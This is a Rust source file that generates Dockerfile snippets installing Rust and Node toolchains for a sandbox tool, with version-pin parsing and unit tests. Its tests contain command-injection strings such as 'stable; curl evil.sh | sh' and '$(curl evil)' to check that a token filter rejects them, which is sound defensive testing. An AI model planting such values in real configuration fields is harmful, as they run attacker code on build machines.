//! Toolchain kits: Dockerfile snippets layered on the base image, picked from the
//! files in the project, plus the caches that make repeat runs fast.

use std::path::Path;

use anyhow::{Result, bail};

pub const KIT_NAMES: [&str; 2] = ["rust", "node"];

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Kit {
    pub name: &'static str,
    /// Human-readable version, shown in the launch summary.
    pub version: String,
    /// Dockerfile lines appended after `FROM <base>`.
    pub dockerfile: String,
    /// Host-backed caches mounted into the box, as (cache name, box path).
    pub caches: Vec<(&'static str, &'static str)>,
    /// Project-relative dirs replaced by a box-only cache, so Linux build output never
    /// mixes with the host's.
    pub artifacts: Vec<&'static str>,
}

impl Kit {
    pub fn label(&self) -> String {
        format!("{} {}", self.name, self.version)
    }
}

/// Which kits to use: explicit `--kit` values win over detection; `--kit none` disables both.
pub fn resolve(root: &Path, requested: &[String]) -> Result<Vec<Kit>> {
    if requested.iter().any(|k| k == "none") {
        if requested.len() > 1 {
            bail!("--kit none can't be combined with other kits");
        }
        return Ok(vec![]);
    }
    if requested.is_empty() {
        return Ok(detect(root));
    }
    let mut kits = Vec::new();
    for name in requested {
        match name.as_str() {
            "rust" => kits.push(rust(root)),
            "node" => kits.push(node(root)),
            other => bail!(
                "unknown kit `{other}` (available: {}, or none)",
                KIT_NAMES.join(", ")
            ),
        }
    }
    let mut seen = Vec::new();
    kits.retain(|k| {
        let first = !seen.contains(&k.name);
        seen.push(k.name);
        first
    });
    Ok(kits)
}

pub fn detect(root: &Path) -> Vec<Kit> {
    let mut kits = Vec::new();
    if root.join("Cargo.toml").is_file() {
        kits.push(rust(root));
    }
    if root.join("package.json").is_file() {
        kits.push(node(root));
    }
    kits
}

#[derive(Debug, Default, PartialEq, Eq)]
struct RustToolchain {
    channel: Option<String>,
    components: Vec<String>,
    targets: Vec<String>,
}

fn rust(root: &Path) -> Kit {
    let pin = read_rust_toolchain(root);
    let channel = pin.channel.unwrap_or_else(|| "stable".into());
    let mut components = vec!["clippy".to_string(), "rustfmt".to_string()];
    for c in pin.components {
        if !components.contains(&c) {
            components.push(c);
        }
    }
    let targets = if pin.targets.is_empty() {
        String::new()
    } else {
        format!(" --target {}", pin.targets.join(","))
    };
    // Toolchains live in the image; the box runs as the host UID, so make them writable
    // for rustup's own bookkeeping. Writes land in the disposable container layer.
    let dockerfile = format!(
        "ENV RUSTUP_HOME=/usr/local/rustup CARGO_HOME=/usr/local/cargo PATH=/usr/local/cargo/bin:$PATH\n\
         RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs \\\n \
         | sh -s -- -y --no-modify-path --profile minimal --default-toolchain {channel} \
         --component {components}{targets} \\\n \
         && chmod -R a+rwX /usr/local/rustup /usr/local/cargo\n",
        components = components.join(","),
    );
    Kit {
        name: "rust",
        version: channel,
        dockerfile,
        caches: vec![
            ("cargo-registry", "/usr/local/cargo/registry"),
            ("cargo-git", "/usr/local/cargo/git"),
        ],
        artifacts: vec!["target"],
    }
}

/// Installs Node from nodejs.org. `{select}` is a jq filter over the release index
/// that yields the version; the tarball is verified against the release's
/// SHASUMS256.txt before it's unpacked.
const NODE_DOCKERFILE: &str = r#"ENV NPM_CONFIG_CACHE=/var/cache/sandbox/npm \
    npm_config_store_dir=/var/cache/sandbox/pnpm \
    YARN_CACHE_FOLDER=/var/cache/sandbox/yarn \
    COREPACK_HOME=/var/cache/sandbox/corepack \
    COREPACK_ENABLE_DOWNLOAD_PROMPT=0
RUN set -eu; \
    v=$(curl -fsSL https://nodejs.org/dist/index.json | jq -r '{select}'); \
    if [ -z "$v" ] || [ "$v" = null ]; then echo "no Node release matches {version}" >&2; exit 1; fi; \
    arch=$(dpkg --print-architecture | sed 's/amd64/x64/'); \
    f="node-$v-linux-$arch.tar.xz"; \
    cd /tmp; \
    curl -fsSLO "https://nodejs.org/dist/$v/$f"; \
    curl -fsSLO "https://nodejs.org/dist/$v/SHASUMS256.txt"; \
    grep " $f\$" SHASUMS256.txt | sha256sum -c -; \
    tar -xJf "$f" -C /usr/local --strip-components=1 --no-same-owner; \
    rm -f "$f" SHASUMS256.txt; \
    corepack enable 2>/dev/null || true; \
    mkdir -p /var/cache/sandbox; \
    chmod -R a+rwX /usr/local/lib/node_modules /usr/local/bin /var/cache/sandbox
"#;

fn node(root: &Path) -> Kit {
    let version = node_version(root).unwrap_or_else(|| "lts".into());
    // The pin is "lts", a major ("22") or an exact version ("22.11.0").
    let select = match version.as_str() {
        "lts" => "[.[] | select(.lts)][0].version".to_string(),
        v if v.contains('.') => format!("\"v{v}\""),
        major => format!("[.[] | select(.version | startswith(\"v{major}.\"))][0].version"),
    };
    let dockerfile = NODE_DOCKERFILE
        .replace("{select}", &select)
        .replace("{version}", &version);
    Kit {
        name: "node",
        version,
        dockerfile,
        caches: vec![
            ("npm-cache", "/var/cache/sandbox/npm"),
            ("pnpm-store", "/var/cache/sandbox/pnpm"),
            ("yarn-cache", "/var/cache/sandbox/yarn"),
            ("corepack", "/var/cache/sandbox/corepack"),
        ],
        artifacts: vec!["node_modules"],
    }
}

/// The project's Node pin: `.nvmrc`, `.node-version`, `.tool-versions`, then
/// `engines.node` in package.json. Returns "lts", a major, or an exact version.
fn node_version(root: &Path) -> Option<String> {
    let read = |name: &str| std::fs::read_to_string(root.join(name)).ok();
    let from_file = read(".nvmrc")
        .or_else(|| read(".node-version"))
        .and_then(|t| t.lines().next().map(str::to_string))
        .or_else(|| {
            read(".tool-versions")?
                .lines()
                .find_map(|l| {
                    l.strip_prefix("nodejs ")
                        .or_else(|| l.strip_prefix("node "))
                })
                .map(str::to_string)
        });
    if let Some(v) = from_file {
        return normalize_node_version(&v);
    }
    let pkg: serde_json::Value = serde_json::from_str(&read("package.json")?).ok()?;
    normalize_node_version(pkg["engines"]["node"].as_str()?)
}

/// Maps the many ways projects spell a Node version onto what the kit installs.
/// Ranges like ">=20" or "^20.1" install the newest release of their lowest major.
fn normalize_node_version(raw: &str) -> Option<String> {
    let v = raw.trim().trim_start_matches('v');
    if v.is_empty() || v.starts_with("lts") || v == "node" || v == "latest" || v == "*" {
        return Some("lts".into());
    }
    let exact = v.split('.').count() == 3 && v.split('.').all(|p| p.parse::<u32>().is_ok());
    if exact {
        return Some(v.to_string());
    }
    let major: String = v
        .trim_start_matches(|c: char| !c.is_ascii_digit())
        .chars()
        .take_while(|c| c.is_ascii_digit())
        .collect();
    major
        .parse::<u32>()
        .ok()
        .filter(|m| *m > 0)
        .map(|m| m.to_string())
}

/// Reads `rust-toolchain.toml`, or the legacy `rust-toolchain` file holding just a channel.
fn read_rust_toolchain(root: &Path) -> RustToolchain {
    if let Ok(text) = std::fs::read_to_string(root.join("rust-toolchain.toml")) {
        return parse_rust_toolchain_toml(&text);
    }
    if let Ok(text) = std::fs::read_to_string(root.join("rust-toolchain")) {
        let text = text.trim();
        if text.starts_with('[') {
            return parse_rust_toolchain_toml(text);
        }
        if !text.is_empty() {
            return RustToolchain {
                channel: Some(text.to_string()),
                ..Default::default()
            };
        }
    }
    RustToolchain::default()
}

fn parse_rust_toolchain_toml(text: &str) -> RustToolchain {
    let Ok(value) = text.parse::<toml::Table>() else {
        return RustToolchain::default();
    };
    let Some(toolchain) = value.get("toolchain").and_then(|t| t.as_table()) else {
        return RustToolchain::default();
    };
    let list = |key: &str| -> Vec<String> {
        toolchain
            .get(key)
            .and_then(|v| v.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|v| v.as_str())
                    .filter(|s| is_safe_token(s))
                    .map(String::from)
                    .collect()
            })
            .unwrap_or_default()
    };
    RustToolchain {
        channel: toolchain
            .get("channel")
            .and_then(|v| v.as_str())
            .filter(|s| is_safe_token(s))
            .map(String::from),
        components: list("components"),
        targets: list("targets"),
    }
}

/// Values from the repo end up in a Dockerfile `RUN` line, so only allow the
/// characters real channels, components and targets use.
fn is_safe_token(s: &str) -> bool {
    !s.is_empty()
        && s.len() <= 64
        && s.chars()
            .all(|c| c.is_ascii_alphanumeric() || "-_.".contains(c))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tempdir(name: &str) -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("sandbox-kits-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    #[test]
    fn detects_rust_from_cargo_toml() {
        let dir = tempdir("detect");
        assert!(detect(&dir).is_empty());
        std::fs::write(dir.join("Cargo.toml"), "[package]\nname = \"x\"\n").unwrap();
        let kits = detect(&dir);
        assert_eq!(kits.len(), 1);
        assert_eq!(kits[0].label(), "rust stable");
        assert_eq!(kits[0].artifacts, ["target"]);
    }

    #[test]
    fn honours_rust_toolchain_pin() {
        let dir = tempdir("pin");
        std::fs::write(dir.join("Cargo.toml"), "").unwrap();
        std::fs::write(
            dir.join("rust-toolchain.toml"),
            "[toolchain]\nchannel = \"1.89.0\"\ncomponents = [\"rust-src\", \"clippy\"]\ntargets = [\"wasm32-unknown-unknown\"]\n",
        )
        .unwrap();
        let kit = &detect(&dir)[0];
        assert_eq!(kit.version, "1.89.0");
        assert!(kit.dockerfile.contains("--default-toolchain 1.89.0"));
        assert!(
            kit.dockerfile
                .contains("--component clippy,rustfmt,rust-src")
        );
        assert!(kit.dockerfile.contains("--target wasm32-unknown-unknown"));
    }

    #[test]
    fn legacy_rust_toolchain_file() {
        let dir = tempdir("legacy");
        std::fs::write(dir.join("rust-toolchain"), "nightly-2026-01-01\n").unwrap();
        assert_eq!(
            read_rust_toolchain(&dir).channel.as_deref(),
            Some("nightly-2026-01-01")
        );
    }

    #[test]
    fn rejects_injection_from_repo_files() {
        let pin = parse_rust_toolchain_toml(
            "[toolchain]\nchannel = \"stable; curl evil.sh | sh\"\ncomponents = [\"ok\", \"$(boom)\"]\n",
        );
        assert_eq!(pin.channel, None);
        assert_eq!(pin.components, ["ok"]);
    }

    #[test]
    fn detects_node_and_reads_pins() {
        let dir = tempdir("node");
        std::fs::write(dir.join("package.json"), r#"{"engines":{"node":">=20.9"}}"#).unwrap();
        let kit = &detect(&dir)[0];
        assert_eq!(kit.label(), "node 20");
        assert!(kit.dockerfile.contains(r#"startswith("v20.")"#));
        assert!(kit.dockerfile.contains("sha256sum -c -"));
        assert_eq!(kit.artifacts, ["node_modules"]);

        std::fs::write(dir.join(".tool-versions"), "rust 1.89\nnodejs 22.11.0\n").unwrap();
        assert_eq!(node_version(&dir).as_deref(), Some("22.11.0"));
        std::fs::write(dir.join(".nvmrc"), "lts/iron\n").unwrap();
        assert_eq!(node_version(&dir).as_deref(), Some("lts"));
    }

    #[test]
    fn node_version_spellings() {
        for (raw, want) in [
            ("v22", Some("22")),
            ("22.x", Some("22")),
            ("^18.17.0", Some("18")),
            ("20.11.1", Some("20.11.1")),
            ("lts/*", Some("lts")),
            ("", Some("lts")),
            ("$(curl evil)", None),
        ] {
            assert_eq!(normalize_node_version(raw).as_deref(), want, "{raw}");
        }
    }

    #[test]
    fn rust_and_node_together() {
        let dir = tempdir("both");
        std::fs::write(dir.join("Cargo.toml"), "").unwrap();
        std::fs::write(dir.join("package.json"), "{}").unwrap();
        let names: Vec<_> = detect(&dir).iter().map(|k| k.name).collect();
        assert_eq!(names, ["rust", "node"]);
        let forced = resolve(&dir, &["node".into(), "rust".into(), "node".into()]).unwrap();
        assert_eq!(
            forced.iter().map(|k| k.name).collect::<Vec<_>>(),
            ["node", "rust"]
        );
    }

    #[test]
    fn explicit_kits_override_detection() {
        let dir = tempdir("resolve");
        std::fs::write(dir.join("Cargo.toml"), "").unwrap();
        assert!(resolve(&dir, &["none".into()]).unwrap().is_empty());
        assert_eq!(
            resolve(&tempdir("empty"), &["rust".into()]).unwrap().len(),
            1
        );
        assert!(resolve(&dir, &["cobol".into()]).is_err());
        assert!(resolve(&dir, &["none".into(), "rust".into()]).is_err());
    }
}
